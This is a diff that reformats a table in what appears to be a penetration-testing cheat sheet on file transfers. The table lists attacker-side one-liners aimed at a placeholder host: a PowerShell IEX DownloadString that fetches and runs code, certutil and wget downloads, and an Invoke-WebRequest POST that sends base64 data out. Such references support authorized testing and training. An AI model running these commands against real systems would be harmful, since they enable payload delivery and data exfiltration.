@@ -4,13 +4,13 @@
 ---
 ## Web Server
 
-| Operation | Command                                                                  | Platform |
-| --------- | ------------------------------------------------------------------------ | -------- |
-| Download  | `IEX (New-Object Net.WebClient).DownloadString('http://<lhost>/<file>')` | Windows  |
-| Download  | `certutil.exe -verifyctl -split -f http://<lhost>/<file>`                | Windows  |
-| Download  | `wget http://<lhost>/<file> -O /tmp/<file>`                              | Linux    |
-| Upload    | `Invoke-WebRequest -Uri http://<lhost>:<port> -Method POST -Body $b64`   | Windows  |
-| Host      | `sudo python3 -m http.server <port>`                                     | Linux    |
+|Operation|Command|Platform|
+|---|---|---|
+|Download|`IEX (New-Object Net.WebClient).DownloadString('http://<lhost>/<file>')`|Windows|
+|Download|`certutil.exe -verifyctl -split -f http://<lhost>/<file>`|Windows|
+|Download|`wget http://<lhost>/<file> -O /tmp/<file>`|Linux|
+|Upload|`Invoke-WebRequest -Uri http://<lhost>:<port> -Method POST -Body $b64`|Windows|
+|Host|`sudo python3 -m http.server <port>`|Linux|
 
 ---
 ## SCP
